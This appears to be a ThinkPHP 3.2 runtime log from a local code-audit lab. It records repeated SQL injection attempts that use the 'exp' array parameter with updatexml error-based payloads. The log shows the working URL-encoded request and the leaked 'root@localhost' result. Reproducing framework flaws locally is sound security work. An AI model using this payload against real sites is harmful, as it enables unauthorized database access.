INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000582s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000628s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0186s ]
ERR: 1582:Incorrect parameter count in the call to native function 'updatexml'
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='aaa' and updatexml(1,concat(0x7e,(select database()),0x7e)),1) LIMIT 1  
ERR: 1582:Incorrect parameter count in the call to native function 'updatexml'
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='aaa' and updatexml(1,concat(0x7e,(select database()),0x7e)),1) LIMIT 1  

[ 2019-04-02T17:34:56+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000073s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000681s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000748s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0316s ]
ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '(and updatexml(1,concat(0x7e,(select database()),0x7e)),1)) LIMIT 1' at line 1
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='aaa' (and updatexml(1,concat(0x7e,(select database()),0x7e)),1)) LIMIT 1  
ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '(and updatexml(1,concat(0x7e,(select database()),0x7e)),1)) LIMIT 1' at line 1
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='aaa' (and updatexml(1,concat(0x7e,(select database()),0x7e)),1)) LIMIT 1  

[ 2019-04-02T17:36:12+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000110s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000806s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000860s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0131s ]
ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '(and updatexml(1,concat(0x7e,(select user()),0x7e)),1)) LIMIT 1' at line 1
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='aaa' (and updatexml(1,concat(0x7e,(select user()),0x7e)),1)) LIMIT 1  
ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '(and updatexml(1,concat(0x7e,(select user()),0x7e)),1)) LIMIT 1' at line 1
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='aaa' (and updatexml(1,concat(0x7e,(select user()),0x7e)),1)) LIMIT 1  

[ 2019-04-02T17:36:49+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000073s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000770s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000835s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0288s ]
ERR: 1105:XPATH syntax error: '~root@localhost1'
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='aaa' and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  
ERR: 1105:XPATH syntax error: '~root@localhost1'
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='aaa' and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  

[ 2019-04-02T20:13:40+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000059s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000625s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000707s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0901s ]
NOTIC: [8] Undefined index: name D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Shop\Home\Controller\IndexController.class.php 第 8 行.
SQL: SELECT `name`,`password` FROM `test` WHERE `name` = null LIMIT 1   [ RunTime:0.0043s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.001544s ]
INFO: [ app_end ] --END-- [ RunTime:0.001640s ]

[ 2019-04-02T20:14:58+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000066s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000699s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000772s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0231s ]
ERR: 表达式错误:aa

[ 2019-04-02T20:15:32+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000007s ]
INFO: [ app_init ] --END-- [ RunTime:0.000043s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000746s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000802s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0319s ]
ERR: 表达式错误:aa

[ 2019-04-02T20:15:35+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000052s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000568s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000612s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0286s ]
ERR: 表达式错误:aa

[ 2019-04-02T20:16:35+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000071s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000739s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000786s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0188s ]
ERR: 表达式错误:aa

[ 2019-04-02T20:16:41+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000008s ]
INFO: [ app_init ] --END-- [ RunTime:0.000043s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001422s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001556s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0331s ]
ERR: 表达式错误:aa

[ 2019-04-02T20:17:16+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000087s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001229s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001483s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0218s ]
ERR: 表达式错误:'aa'

[ 2019-04-02T20:17:28+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000048s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001390s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001501s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0314s ]
NOTIC: [8] Undefined offset: 0 D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php 第 551 行.
NOTIC: [8] Undefined offset: 0 D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php 第 597 行.
NOTIC: [8] Undefined offset: 0 D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php 第 597 行.
NOTIC: [8] Undefined offset: 0 D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php 第 598 行.
NOTIC: [8] Undefined offset: 0 D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php 第 601 行.
SQL: SELECT `name`,`password` FROM `test` WHERE ( `name` = null  ) LIMIT 1   [ RunTime:0.0009s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.002663s ]
INFO: [ app_end ] --END-- [ RunTime:0.002825s ]

[ 2019-04-02T20:17:44+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: [ app_init ] --END-- [ RunTime:0.000071s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000572s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000638s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0174s ]
ERR: 表达式错误:aa

[ 2019-04-02T20:18:31+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000047s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000830s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000911s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0239s ]
ERR: 表达式错误:aa

[ 2019-04-02T20:18:36+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000052s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000520s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000560s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0292s ]
ERR: 表达式错误:aa

[ 2019-04-02T20:19:21+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000046s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000545s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000586s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0323s ]
ERR: 1105:XPATH syntax error: '~root@localhost1'
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='xxx' and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  
ERR: 1105:XPATH syntax error: '~root@localhost1'
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='xxx' and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  

[ 2019-04-02T20:19:30+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000064s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000580s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000624s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0287s ]
ERR: 表达式错误:qqq

[ 2019-04-02T20:19:37+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000008s ]
INFO: [ app_init ] --END-- [ RunTime:0.000045s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000515s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000555s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0329s ]
ERR: 1105:XPATH syntax error: '~root@localhost1'
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='xxx' and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  
ERR: 1105:XPATH syntax error: '~root@localhost1'
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='xxx' and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  

[ 2019-04-02T20:20:06+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000098s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000551s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000598s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0263s ]
ERR: 表达式错误:expe

[ 2019-04-02T20:20:11+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000071s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000888s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000956s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0137s ]
ERR: 1105:XPATH syntax error: '~root@localhost1'
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='xxx' and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  
ERR: 1105:XPATH syntax error: '~root@localhost1'
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='xxx' and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  

[ 2019-04-02T20:27:26+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000026s ]
INFO: [ app_init ] --END-- [ RunTime:0.000073s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000651s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000704s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0290s ]
NOTIC: [8] Undefined index: name D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Shop\Home\Controller\IndexController.class.php 第 8 行.
SQL: SELECT `name`,`password` FROM `test` WHERE `name` = null LIMIT 1   [ RunTime:0.0004s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.001229s ]
INFO: [ app_end ] --END-- [ RunTime:0.001295s ]

[ 2019-04-02T20:27:31+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000049s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000633s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000679s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0333s ]
ERR: 1105:XPATH syntax error: '~root@localhost1'
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='xxx' and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  
ERR: 1105:XPATH syntax error: '~root@localhost1'
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='xxx' and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  

[ 2019-04-02T20:28:11+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000008s ]
INFO: [ app_init ] --END-- [ RunTime:0.000046s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001850s ]
INFO: [ app_begin ] --END-- [ RunTime:0.002130s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0331s ]
ERR: 1105:XPATH syntax error: '~root@localhost1'
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='xxx' and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  
ERR: 1105:XPATH syntax error: '~root@localhost1'
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='xxx' and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  

[ 2019-04-02T20:28:59+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/index.php?name[0]=exp&name[1]==%27xxx%27%20and%20updatexml(1,concat(0x7e,(select%20user()),1),1)
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000048s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000574s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000622s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0121s ]
ERR: 1105:XPATH syntax error: '~root@localhost1'
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='xxx' and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  
ERR: 1105:XPATH syntax error: '~root@localhost1'
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='xxx' and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  

[ 2019-04-02T20:29:08+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/index.php?name[0]=exp&name[1]==%27xxx%27%20and%20updatexml(1,concat(0x7e,(select%20user()),1),1)
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000081s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000775s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000880s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0313s ]
ERR: 1105:XPATH syntax error: '~root@localhost1'
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='xxx' and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  
ERR: 1105:XPATH syntax error: '~root@localhost1'
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='xxx' and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  

[ 2019-04-02T20:29:13+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/index.php?name[0]=exp&name[1]==%27xxx%27%20and%20updatexml(1,concat(0x7e,(select%20user()),1),1)
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000043s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000513s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000553s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0175s ]
ERR: 1105:XPATH syntax error: '~root@localhost1'
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='xxx' and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  
ERR: 1105:XPATH syntax error: '~root@localhost1'
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='xxx' and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  

[ 2019-04-02T20:29:21+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/index.php?name[0]=exp&name[1]==%27xxx%27%20and%20updatexml(1,concat(0x7e,(select%20user()),1),1)
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000008s ]
INFO: [ app_init ] --END-- [ RunTime:0.000046s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000607s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000646s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0298s ]
ERR: 1105:XPATH syntax error: '~root@localhost1'
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='xxx' and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  
ERR: 1105:XPATH syntax error: '~root@localhost1'
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='xxx' and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  

[ 2019-04-02T20:29:43+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/index.php?name[0]=exp&name[1]==%27xxx%27%20and%20updatexml(1,concat(0x7e,(select%20user()),1),1)
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000047s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000638s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000676s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0283s ]
ERR: 1105:XPATH syntax error: '~root@localhost1'
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='xxx' and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  
ERR: 1105:XPATH syntax error: '~root@localhost1'
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='xxx' and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  

[ 2019-04-02T20:29:46+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/index.php?name[0]=exp&name[1]==%27xxx%27%20and%20updatexml(1,concat(0x7e,(select%20user()),1),1)
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000007s ]
INFO: [ app_init ] --END-- [ RunTime:0.000043s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000611s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000664s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0290s ]
ERR: 1105:XPATH syntax error: '~root@localhost1'
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='xxx' and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  
ERR: 1105:XPATH syntax error: '~root@localhost1'
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='xxx' and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  

[ 2019-04-02T20:30:07+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/index.php?name[0]=exp&name[1]==%27xxx%27%20and%20updatexml(1,concat(0x7e,(select%20user()),1),1)
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000007s ]
INFO: [ app_init ] --END-- [ RunTime:0.000041s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000536s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000573s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0300s ]
ERR: 1105:XPATH syntax error: '~root@localhost1'
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='xxx' and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  
ERR: 1105:XPATH syntax error: '~root@localhost1'
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='xxx' and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  

[ 2019-04-02T20:30:44+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/index.php?name[0]=exp&name[1]==%27xxx%27%20and%20updatexml(1,concat(0x7e,(select%20user()),1),1)
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000051s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000561s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000604s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0315s ]
ERR: 1105:XPATH syntax error: '~root@localhost1'
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='xxx' and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  
ERR: 1105:XPATH syntax error: '~root@localhost1'
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='xxx' and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  

[ 2019-04-02T20:30:52+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/index.php?name[0]=exp&name[1]==%27xxx%27%20and%20updatexml(1,concat(0x7e,(select%20user()),1),1)
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000119s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000583s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000626s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0277s ]
ERR: 1105:XPATH syntax error: '~root@localhost1'
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='xxx' and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  
ERR: 1105:XPATH syntax error: '~root@localhost1'
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='xxx' and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  

[ 2019-04-02T20:31:01+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/index.php?name[0]=exp&name[1]==%27xxx%27%20and%20updatexml(1,concat(0x7e,(select%20user()),1),1)
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000007s ]
INFO: [ app_init ] --END-- [ RunTime:0.000045s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000553s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000593s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0337s ]
ERR: 1105:XPATH syntax error: '~root@localhost1'
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='xxx' and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  
ERR: 1105:XPATH syntax error: '~root@localhost1'
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='xxx' and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  

[ 2019-04-02T20:31:12+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/index.php?name[0]=exp&name[1]==%27xxx%27%20and%20updatexml(1,concat(0x7e,(select%20user()),1),1)
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000008s ]
INFO: [ app_init ] --END-- [ RunTime:0.000044s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000532s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000576s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0318s ]
ERR: 1105:XPATH syntax error: '~root@localhost1'
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='xxx' and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  
ERR: 1105:XPATH syntax error: '~root@localhost1'
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='xxx' and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  

[ 2019-04-02T20:32:06+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/index.php?name[0]=exp&name[1]==%27xxx%27%20and%20updatexml(1,concat(0x7e,(select%20user()),1),1)
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000118s ]
INFO: [ app_init ] --END-- [ RunTime:0.006241s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001773s ]
